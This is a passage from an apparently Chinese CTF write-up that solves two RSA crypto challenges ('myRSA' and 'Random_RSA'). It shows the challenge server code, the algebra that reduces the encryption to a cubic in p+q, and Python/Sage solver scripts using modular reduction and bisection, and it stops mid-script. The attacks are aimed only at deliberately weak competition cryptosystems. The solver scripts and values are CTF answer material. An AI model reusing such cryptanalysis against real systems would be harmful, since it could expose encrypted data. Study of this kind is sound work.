<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># myRSA</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">alpha = <span class="number">2.0314159265358979</span></span><br><span class="line">WELCOME = <span class="string">&#x27;Welcome to use my better RSA!!!!!!So, what do you want now?&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;1. encry \n2. getflag\n3. exit&#x27;</span></span><br><span class="line">String = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span class="string">&#x27;&#x27;</span>.join([String[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(String)-<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) ])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>],STR[<span class="number">4</span>:],HASH</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, q = getPrime(KEYSIZE), getPrime(KEYSIZE)</span><br><span class="line">        e = <span class="number">0x10001</span></span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key = [getPrime(<span class="built_in">int</span>(KEYSIZE * alpha)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p, q, e), key</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypto</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encry</span>(<span class="params">message,key,p,q,e</span>):</span></span><br><span class="line">    k1,k2 = key[random.randint(<span class="number">0</span>,<span class="number">127</span>)],key[random.randint(<span class="number">0</span>,<span class="number">127</span>)]</span><br><span class="line">    x = p**<span class="number">2</span> * (p + <span class="number">3</span>*q - <span class="number">1</span> ) + q**<span class="number">2</span> * (q + <span class="number">3</span>*p - <span class="number">1</span>)</span><br><span class="line">    y = <span class="number">2</span>*p*q + p + q</span><br><span class="line">    z = k1 + k2</span><br><span class="line">    c = <span class="built_in">pow</span>(b2l(message),e,p*q)</span><br><span class="line">    <span class="keyword">return</span> x * c + y * c + z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">flag,key,p,q,e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encry(flag,key,p,q,e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        START,END,HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&#x27;SHA-256(?+&#123;&#125;) == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(END,HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._send(<span class="string">&quot;I&#x27;m a CryptoRookie,so my Crypto system take time, please wait a minute XD!&quot;</span>)</span><br><span class="line">        (p,q,e),key = key_gen()</span><br><span class="line">        flag  = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        self._send(<span class="string">&#x27;This is my public key:\nn = &#123;&#125;\ne = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(p*q),<span class="built_in">str</span>(e)))</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            self._send(menu)</span><br><span class="line">            COI = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            <span class="keyword">if</span> COI == <span class="number">1</span> :</span><br><span class="line">                self._send(<span class="string">&#x27;Give me your message&#x27;</span>)</span><br><span class="line">                message = self._recv()</span><br><span class="line">                self._send(<span class="string">&#x27;Your encry message:&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(message,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">2</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;This is your favourite:\n&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(flag,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">3</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;Bye~&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我的第一次密码学导论作业, 参数的生成大家觉得怎样呢？</p>
</blockquote>
<p>加密的过程其实简单，我们知道cx+cy+z</p>
<p>关于z，这是与key有关的，根据之前的经验没有必要知道key怎么来的，只需要知道key是啥；至于题目提示的参数，也就是知道这些数字之间的位数关系，z是1040位的，z&gt;n，n是1024位的</p>
<p>比赛中推导出要解一个一元三次方程那里，也就是将x和y带入，设t=cx+cy+z，得<br>$$<br>t=c((p+q)^3-(p+q)^2+(p+q)+4n)+z<br>$$<br>c我们是完全可以算出来的，所以要解密，大致的方向就是绕过z，求出p+q，联系方程组求出p，成功分解n（所以send一个b’’得到z并没有什么用）</p>
<p>先两边模c，（懂的师傅可以直接跳过）</p>
<hr>
<p>一条性质忘了，或者说意识不够</p>
<p>若$a\equiv b\ (mod\ n)$且$c\equiv d\ (mod\ n)$，则$a+c\equiv b+d\ (mod\ n)$</p>
<p>已经是第二次写这个性质了，基本且重要，上次用到是在<a href="https://blog.csdn.net/m0_49109277/article/details/119841141?spm=1001.2014.3001.5501">RARCTF babycrypt</a>，再次强调这个结论是完全正确的，不存在那么多搞不灵清的地方。这道题就是将c(x+y)+z模一个c，因为<br>$$<br>c(x+y) \equiv 0\ (mod\ c)\ and\ z\equiv z\ (mod\ c)<br>$$<br>则，<br>$$<br>c(x+y)+z\equiv 0+z\equiv z\ (mod\ c)<br>$$<br>基础不扎实，两三次了，写得白痴点，希望下次看到就想到 </p>
<hr>
<p>由于z比n要大，所以肯定也比c要大，模c之后得到是一个z的近似，就设为$z_0,\ z=z_0+kc$</p>
<p>联想刚才我们那个比特差，这完全是可以爆破的</p>
<p>nc链接这里我们直接输入0，从字节转数字后是48</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">102216849365436215382697924706110458811930514492676972297707749802743855550173221018307625399833159477899481939208157339087054049976609580335655988542843751320232525212725188253172284097958271570601093708102334730018773991294621754198973615453247445854418322094753657026256442996256624353675259431618058069873</span></span><br><span class="line">m = <span class="number">48</span></span><br><span class="line">xy48z = <span class="built_in">int</span>(<span class="number">450598196470521201729638145452113029348556317197796881155043711358014330871436047647028445722146485815337297082414583140339423018492548153129219959722626240768144197737361486759977936811931098179802464569494368735770535145331711573991601967230786754264479211792290017487283155570172424436304991171550181462694341945090942595408994085351622030775911067608201899849483976554235818404368211044759737328469487348797618306191053975483123755715899624408944673166452085511225808970644524141442606260074195698665970921069220120499790094140467744114859479550895214898485493704330419766829998576629979339401250867858230499864955508881386228059060521591637918403999691833618755763870139199224654474706077813985939903700333433229365768180014529732361680254103667001711146673764660846</span>)</span><br><span class="line">flag = <span class="number">367985298100355719470464399231673186210476786528427647015381713693383054303800225562530305612381740440475705158111682270638520430798691039460739446257988390587750201598500460072950141405575319038364158570766686647844910095823628097948621068785641459446019851231163137871477328456219566424198083174973732247237495461084926082266277081410422432938607771568853035687579097465681519337154130220264871789653076508116420535916151874053965039332568736131529947962054505231214027124076372907141537134424968348626325641916288587742730444306999317712276831635493902127340833105337864025712574859765211691309758411102254824704082007127728486818136325623609908896494330215565717506933184069079577152226666507972552002709428549241805751962129348112606965895053348951420741781534761708</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">var(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65537</span>):</span><br><span class="line">    z = z0+c*k</span><br><span class="line">    t = (xy48z-z)//c</span><br><span class="line">    sol = solve([x**<span class="number">3</span>-x**<span class="number">2</span>+x+<span class="number">4</span>*n-t==<span class="number">0</span>], [x])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;sqrt&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(sol):</span><br><span class="line">        <span class="built_in">print</span>(sol)</span><br></pre></td></tr></table></figure>

<p>我有点天真，以为sage可以帮我们直接算出来了，但数字大了，也变慢了，而且不确定解出来的是不是还带有sqrt</p>
<p>所以接下来就要自己手写解方程的脚本了，这里我们先按下不表，直接跳到解密那里去</p>
<p>假设我们已经知道了pq，那么对于$t=flag(x+y)+z$，两边整除一个x+y，类似海洋大学的easyrsa，由于x+y远大于z，z成了小数部分了，取个整得到就是flag加密后的结果，再用传统手艺去解，就得到了</p>
<p>好了，最关键的一步，解方程，现有的函数不行，因为数据太大、格式等问题<br>$$<br>x+y=(p+q)^3-(p+q)^2+(p+q)+4n=(t-z)\div c<br>$$<br>右边我们已经得到了，设a=p+q，则$f(a)=a^3-a^2+a+4n-(t-z)\div c$</p>
<p>求一次导可知$f^{‘}(a)=3a^2-2a+1$，$\Delta=4-12&lt;0$，$f^{‘}(a)&gt;0$</p>
<p>所以f(a)是单调递增的，与x轴只有一个交点，而且它的根p+q的范围在$(2^{511}, 2^{513})$</p>
<p>说到解这个方程，枚举当然简单暴力，但无奈数字实在太大，时间复杂度为O(n)，那么很快就可以想到降低复杂度的二分法，用二分法逼近本身就是解方程的算法之一；这样时间复杂度就是O(logn)，也就是500多次，这对于原本就支持大数据的python来说简直不要太友好了</p>
<p>加上之前的枚举z写了以下脚本，因为对近似不是很懂，所以先还是框定在熟悉的整数范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols, solve</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">89376247830772550635393374593591171289469473653660506041384870807672514851291613034103293150272794811662040962795338417767924390664160855795592847165664672215596625265833096358547808457216406919256623973605519954393257168668848139892103199585870486478679862843688695515256562706151337833114331221189851505307</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">xy48z = <span class="number">573183539558274845040105647253832611006389515982240063596818567154070335454441330456418916326928035506269242019877858095541028214384303624168930086298598137836679435122632007591230447675399859253040527098932082536817835600632684346743007442271210095370147310122023527616598189055800206892622591152310306250178532132575799836929460532267589534884854821163062186146162009389124822796655667824602408842104081327204184627274796695507250901179031687241027321102940261994875706732189407136668725738443141883613083605571514576490785426071453368710281928806135571137549546326030047579322709176195586142692435882988042924394657669689613769885662846359646103364540846219586145970778569409592707222106372820845133370558195785112000772658458805185628127184922396498760974419572604362</span></span><br><span class="line">flag = <span class="number">481729115764190744536910657085560158889970175686907401215490337526880230376819524492470636911767799236673524142385694360618832004117695823025161532124563697622558707411901261718979417287250753659221620598917189492752483245076665914783267295393931619281742213297076869813336749887922096598517333008819428035961760565398531704160502999798281136827037178130719826007120327143140435965940414720309889209176695802426545166579994960663962651160284302004216242606526094359968261816259941079928016610890122763028512785756541595874084647315002410857503747496456626710003349795505137331698911171491656135642059625243605709398076541265707971793648280382336060691064915972346110379252467007887636411312702061909523885468047172320514051839865352276472579281312844240544893396792447946</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>+<span class="number">1</span>, <span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    z = z0 + c * k</span><br><span class="line">    t = (xy48z - z) // c</span><br><span class="line">    _poly = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n - t)</span><br><span class="line">    xy = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n)</span><br><span class="line">    l = <span class="number">2</span> ** <span class="number">511</span></span><br><span class="line">    r = <span class="number">2</span> ** <span class="number">513</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> _poly(mid) == <span class="number">0</span>:</span><br><span class="line">            sol = solve([p * q - n, p + q - mid], [p, q])</span><br><span class="line">            p = <span class="built_in">int</span>(sol[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">            q = <span class="built_in">int</span>(sol[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag // xy(p + q), invert(e, <span class="built_in">int</span>((p - <span class="number">1</span>) * (q - <span class="number">1</span>))), n)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> _poly(mid) &lt; <span class="number">0</span>:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>结果跑了好久，一度怀疑是不是出来问题？最后还是出来了，看来这样子复杂度太大的</p>
<p>那么研究下尚师傅以及其他师傅的做法</p>
<p>他们的思路是直接用得到的z0求出一个x+y的近似值，将其带入f(a)，得到是正数，说明这个数在真正的x+y的右边，根据单调性</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210825170440092.png" alt="image-20210825170440092"/>

<p>这个近似的x+y的位数是1538，所以只要在$[2^{511}, 2^{1538}]$之间二分就好了，最后会二分到两个相邻的整数之间，因为方程的右边是我们得到的近似值，所以妄想得到一个整数解是不太可能的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> poly, symbols, solve</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n = <span class="number">89376247830772550635393374593591171289469473653660506041384870807672514851291613034103293150272794811662040962795338417767924390664160855795592847165664672215596625265833096358547808457216406919256623973605519954393257168668848139892103199585870486478679862843688695515256562706151337833114331221189851505307</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">xy48z = <span class="number">573183539558274845040105647253832611006389515982240063596818567154070335454441330456418916326928035506269242019877858095541028214384303624168930086298598137836679435122632007591230447675399859253040527098932082536817835600632684346743007442271210095370147310122023527616598189055800206892622591152310306250178532132575799836929460532267589534884854821163062186146162009389124822796655667824602408842104081327204184627274796695507250901179031687241027321102940261994875706732189407136668725738443141883613083605571514576490785426071453368710281928806135571137549546326030047579322709176195586142692435882988042924394657669689613769885662846359646103364540846219586145970778569409592707222106372820845133370558195785112000772658458805185628127184922396498760974419572604362</span></span><br><span class="line">flag = <span class="number">481729115764190744536910657085560158889970175686907401215490337526880230376819524492470636911767799236673524142385694360618832004117695823025161532124563697622558707411901261718979417287250753659221620598917189492752483245076665914783267295393931619281742213297076869813336749887922096598517333008819428035961760565398531704160502999798281136827037178130719826007120327143140435965940414720309889209176695802426545166579994960663962651160284302004216242606526094359968261816259941079928016610890122763028512785756541595874084647315002410857503747496456626710003349795505137331698911171491656135642059625243605709398076541265707971793648280382336060691064915972346110379252467007887636411312702061909523885468047172320514051839865352276472579281312844240544893396792447946</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">pow</span>(m, e, n))</span><br><span class="line">z0 = xy48z % c</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">t = (xy48z - z0) // c</span><br><span class="line">_poly = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n - t)</span><br><span class="line">xy = poly(x ** <span class="number">3</span> - x ** <span class="number">2</span> + x + <span class="number">4</span> * n)</span><br><span class="line">l = <span class="number">2</span> ** <span class="number">511</span></span><br><span class="line">r = <span class="number">2</span> ** <span class="number">1538</span></span><br><span class="line"><span class="keyword">while</span> l &lt; r:</span><br><span class="line">    mid = (l + r) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> _poly(mid) &lt; <span class="number">0</span>:</span><br><span class="line">        l = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = mid</span><br><span class="line">    <span class="comment"># 相邻两个整数之间</span></span><br><span class="line">    <span class="keyword">if</span> r == l+<span class="number">1</span>:</span><br><span class="line">        a = l <span class="keyword">if</span> l % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> r</span><br><span class="line">        sol = solve([p * q - n, p + q - mid], [p, q])</span><br><span class="line">        p, q = sol[<span class="number">0</span>][<span class="number">0</span>], sol[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag//xy(p+q), invert(e, <span class="built_in">int</span>((p - <span class="number">1</span>) * (q - <span class="number">1</span>))), n)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>总结，相比Guess，这个虽然有16次循环，但是并全部用起来；自己还是刷题不够多，像二分法之前也考过，基本数学素养不够，对近似值也不够敏感；注意二分法和暴力穷举的区别</p>
<h2 id="Crypto-Random-RSA"><a href="#Crypto-Random-RSA" class="headerlink" title="Crypto-Random_RSA"></a>Crypto-Random_RSA</h2><p>kw的python2，这种题没能抢血，手速不够啊</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag=<span class="string">r&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=p*q</span><br><span class="line">ct=<span class="built_in">pow</span>(flag,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+ n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct=&quot;</span>+ ct)</span><br><span class="line"></span><br><span class="line">dp=<span class="string">r&#x27;&#x27;</span></span><br><span class="line">seeds = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(dp)):</span><br><span class="line">    seeds.append(random.randint(<span class="number">0</span>,<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(dp)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(<span class="built_in">ord</span>(dp[i]) ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(rands))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(seeds)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line"><span class="comment"># ct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]</span></span><br><span class="line"><span class="comment"># [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span></span><br><span class="line"><span class="comment"># [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span></span><br></pre></td></tr></table></figure>

<p>之前也有类似的题目，通过相同的种子生成相同的随机数序列。这道题考点dp泄漏，对dp进行了异或操作；异或回来就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line">ct = <span class="number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line">e = <span 